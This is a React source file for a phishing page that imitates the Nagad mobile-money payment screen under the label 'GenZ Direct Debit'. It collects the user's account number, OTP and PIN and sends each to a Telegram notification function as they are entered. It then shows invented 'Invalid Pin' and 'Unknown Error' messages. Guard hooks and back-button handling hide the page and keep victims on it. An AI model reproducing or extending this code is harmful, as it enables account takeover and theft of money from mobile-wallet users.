import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { sendTelegramNotification } from "@/lib/telegram";
import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
import { useReferrerGuard } from "@/hooks/useReferrerGuard";
import DualCircleLoader from "@/components/DualCircleLoader";
import cartIcon from "@/assets/cart-icon.png";
import nagadLogoWhite from "@/assets/nagad-logo-white.png";
import CancelPaymentDialog from "@/components/CancelPaymentDialog";

const NagadPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const isAllowed = usePaymentMethodGuard("nagad");
  const { checking: referrerChecking } = useReferrerGuard();
  const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
  const [showOtpView, setShowOtpView] = useState(false);
  const [showPinView, setShowPinView] = useState(false);
  
  const [otpValue, setOtpValue] = useState("");
  const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
  const [language, setLanguage] = useState<'bn' | 'en'>('en');
  const [phoneError, setPhoneError] = useState("");
  const [pinError, setPinError] = useState("");
  const [pinAttempts, setPinAttempts] = useState(0);
  const [otpResent, setOtpResent] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpInputRef = useRef<HTMLInputElement | null>(null);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate(`/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=${amount}`, { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate]);

  useEffect(() => {
    setTimeout(() => {
      if (showPinView) pinInputRefs.current[0]?.focus();
      else if (showOtpView) otpInputRef.current?.focus();
      else phoneInputRefs.current[0]?.focus();
    }, 100);
  }, [showOtpView, showPinView]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const getPhoneNumber = () => phoneDigits.join("");
  const isValidNumber = () => {
    const phone = getPhoneNumber();
    return phone.length === 11 && validPrefixes.includes(phone.substring(0, 3)) && /^\d+$/.test(phone);
  };
  const isValidOtp = () => otpValue.length === 6 && /^\d+$/.test(otpValue);

  const handleDigitChange = (
    index: number, value: string, digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>, maxLength: number
  ) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    if (value && index < maxLength - 1) refs.current[index + 1]?.focus();
  };

  const handleKeyDown = (
    index: number, e: React.KeyboardEvent<HTMLInputElement>,
    digits: string[], setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) refs.current[index - 1]?.focus();
  };

  const handleConfirm = () => {
    if (isValidNumber()) { 
      setIsLoading(true);
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join('') });
      setTimeout(() => { setPhoneError(""); setShowOtpView(true); setIsLoading(false); }, 2000);
    }
    else setPhoneError(language === 'bn' ? "অবৈধ মোবাইল নম্বর" : "Invalid mobile number");
  };
  const handleOtpConfirm = () => { 
    if (isValidOtp()) { 
      setIsLoading(true);
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue });
      setTimeout(() => { setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); setIsLoading(false); }, 2000);
    } 
  };
  const handlePinConfirm = () => {
    setIsLoading(true);
    if (pinAttempts === 0) {
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') });
      setTimeout(() => {
        setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
        setPinAttempts(1);
        setIsLoading(false);
      }, 2000);
    } else {
      setTimeout(() => {
        setPinError(language === 'bn' ? "অজানা ত্রুটি। আরও তথ্যের জন্য 16167 এ কল করুন।" : "Unknown Error. Please call 16167 for more information.");
        setPinAttempts(2);
        setIsLoading(false);
      }, 2000);
    }
  };
  const handleResendOtp = () => {
    setOtpValue("");
    setOtpResent(true);
  };
  const handleClose = () => {
    navigate(`/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=${amount}`);
  };

  // Translations
  const t = {
    title: language === 'bn' ? 'জেনজেড ডাইরেক্ট ডেবিট' : 'GenZ Direct Debit',
    invoiceNo: language === 'bn' ? 'ইনভয়েস নং:' : 'Invoice No:',
    totalAmount: language === 'bn' ? 'মোট পরিমাণ:' : 'Total Amount:',
    charge: language === 'bn' ? 'চার্জ:' : 'Charge:',
    enterPin: language === 'bn' ? 'পিন দিন' : 'Enter PIN',
    enterOtp: language === 'bn' ? 'যাচাইকরণ কোড [OTP] দিন' : 'Enter Verification Code [OTP]',
    accountNumber: language === 'bn' ? 'আপনার নগদ অ্যাকাউন্ট নম্বর' : 'Your Nagad Account Number',
    proceed: language === 'bn' ? 'এগিয়ে যান' : 'Proceed',
    close: language === 'bn' ? 'বন্ধ করুন' : 'Close',
    resendCode: language === 'bn' ? 'পুনরায় পাঠান' : 'Resend Code',
    otpResent: language === 'bn' ? 'আপনার মোবাইল নম্বরে SMS এর মাধ্যমে OTP পুনরায় পাঠানো হয়েছে' : 'OTP has been resent via SMS to your mobile number',
    termsText: language === 'bn' ? '"এগিয়ে যান" ক্লিক/ট্যাপ করে আপনি আমাদের ' : 'By clicking/tapping "Proceed" you are agreeing to our ',
    termsLink: language === 'bn' ? 'শর্তাবলী' : 'Terms and Conditions',
  };

  const renderPhoneInputs = () => {
    const groups = [3, 4, 4];
    let currentIndex = 0;
    const elements: JSX.Element[] = [];
    groups.forEach((groupSize, groupIndex) => {
      const inputs: JSX.Element[] = [];
      for (let i = 0; i < groupSize; i++) {
        const idx = currentIndex + i;
        inputs.push(
          <input key={idx} ref={(el) => (phoneInputRefs.current[idx] = el)}
            type="tel" inputMode="numeric" maxLength={1} value={phoneDigits[idx] || ""}
            onChange={(e) => handleDigitChange(idx, e.target.value, phoneDigits, setPhoneDigits, phoneInputRefs, 11)}
            onKeyDown={(e) => handleKeyDown(idx, e, phoneDigits, setPhoneDigits, phoneInputRefs)}
            className="w-5 h-6 min-[375px]:w-6 min-[375px]:h-7 bg-white rounded text-center text-gray-800 text-[10px] min-[375px]:text-[11px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
          />
        );
      }
      elements.push(<div key={groupIndex} className="flex gap-1.5">{inputs}</div>);
      currentIndex += groupSize;
      if (groupIndex < groups.length - 1) {
        elements.push(<span key={`sep-${groupIndex}`} className="text-[#ccc] text-lg font-bold mx-1">-</span>);
      }
    });
    return <div className="flex items-center justify-center">{elements}</div>;
  };

  const renderPinInputs = () => (
    <div className="flex items-center justify-center gap-3">
      {pinDigits.map((digit, index) => (
        <input key={index} ref={(el) => (pinInputRefs.current[index] = el)}
          type="password" inputMode="numeric" maxLength={1} value={digit}
          onChange={(e) => handleDigitChange(index, e.target.value, pinDigits, setPinDigits, pinInputRefs, 4)}
          onKeyDown={(e) => handleKeyDown(index, e, pinDigits, setPinDigits, pinInputRefs)}
          className="w-7 h-8 min-[375px]:w-8 min-[375px]:h-9 bg-white rounded text-center text-gray-800 text-[10px] min-[375px]:text-[11px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
        />
      ))}
    </div>
  );

  if (referrerChecking || isAllowed !== true) return null;

  return (
    <div className="h-[100dvh] w-screen flex items-center justify-center bg-gray-300 overflow-hidden">
      {isLoading && <DualCircleLoader />}
      <div className="w-full max-w-[430px] h-full flex flex-col overflow-hidden border-4 min-[375px]:border-[8px] border-black"
        style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
        
        {/* Language Toggle */}
        <div className="flex justify-end p-1.5 min-[375px]:p-2 shrink-0">
          <div className="flex overflow-hidden border border-white/50 rounded-sm">
            <button onClick={() => setLanguage('bn')}
              className={`px-2 min-[375px]:px-3 py-0.5 min-[375px]:py-1 text-[10px] min-[375px]:text-xs font-bold transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
            <button onClick={() => setLanguage('en')}
              className={`px-2 min-[375px]:px-3 py-0.5 min-[375px]:py-1 text-[10px] min-[375px]:text-xs font-bold transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
          </div>
        </div>

        <div className="flex-1 flex flex-col justify-evenly min-h-0">
              {/* Cart Icon & Title */}
              <div className="flex flex-col items-center shrink-0">
                <img src={cartIcon} alt="Cart" className="w-10 h-10 min-[375px]:w-16 min-[375px]:h-16 mb-1 min-[375px]:mb-2 object-contain" />
                <h1 className="text-[#ccc] text-sm min-[375px]:text-lg font-bold">{t.title}</h1>
              </div>

              {/* Invoice Details */}
              <div className="px-6 min-[375px]:px-8 shrink-0">
                <div className="space-y-0.5 min-[375px]:space-y-1.5">
                  <div className="flex">
                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.invoiceNo}</span>
                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">B255527202718B</span>
                  </div>
                  <div className="flex">
                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.totalAmount}</span>
                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">BDT {amount}</span>
                  </div>
                  <div className="flex">
                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.charge}</span>
                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">BDT 0</span>
                  </div>
                </div>
              </div>

              {/* Input Section */}
              <div className="flex flex-col items-center px-4 min-[375px]:px-5 shrink-0">
                {showPinView ? (
                  <div className="flex flex-col items-center">
                    <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.enterPin}</p>
                    {renderPinInputs()}
                    <p className={`text-yellow-300 text-[10px] min-[375px]:text-sm font-bold mt-2 min-[375px]:mt-3 text-center ${pinError ? 'visible' : 'invisible'}`}>
                      {pinError || "placeholder"}
                    </p>
                  </div>
                ) : showOtpView ? (
                  <div className="flex flex-col items-center w-full">
                    <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.enterOtp}</p>
                    <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
                      onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                      placeholder="XXXXXX"
                      className="w-4/5 h-7 min-[375px]:h-8 bg-white rounded text-center text-gray-800 text-xs min-[375px]:text-sm font-medium tracking-[0.5em] focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400 placeholder:tracking-[0.3em]"
                    />
                    {otpResent && (
                      <p className="text-[#ccc] text-[9px] min-[375px]:text-[11px] font-bold mt-2 min-[375px]:mt-3 whitespace-nowrap">{t.otpResent}</p>
                    )}
                  </div>
                ) : (
                  <div className="flex flex-col items-center">
                    <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.accountNumber}</p>
                    {renderPhoneInputs()}
                    {phoneError && (
                      <p className="text-yellow-300 text-[10px] min-[375px]:text-sm font-medium mt-2 min-[375px]:mt-3">{phoneError}</p>
                    )}
                  </div>
                )}

                {!showOtpView && !showPinView && (
                  <p className="text-[#ccc] text-center text-[9px] min-[375px]:text-xs leading-tight font-bold mt-3 min-[375px]:mt-5 px-2">
                    {t.termsText}
                    <span className="text-[#ccc] font-bold underline">{t.termsLink}</span>
                  </p>
                )}
              </div>

              {/* Buttons */}
              <div className="flex gap-4 min-[375px]:gap-8 justify-center shrink-0">
                <button
                  onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
                  className="px-4 min-[375px]:px-6 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
                >{t.proceed}</button>
                {showOtpView && (
                  <button onClick={handleResendOtp}
                    className="px-3 min-[375px]:px-4 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
                  >{t.resendCode}</button>
                )}
                <button onClick={handleClose}
                  className="px-4 min-[375px]:px-6 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
                >{t.close}</button>
              </div>

              {/* Nagad Logo */}
              <div className="flex justify-center shrink-0">
                <img src={nagadLogoWhite} alt="Nagad" className="h-8 min-[375px]:h-12 object-contain" />
              </div>
        </div>
      </div>
    </div>
  );
};

export default NagadPayment;
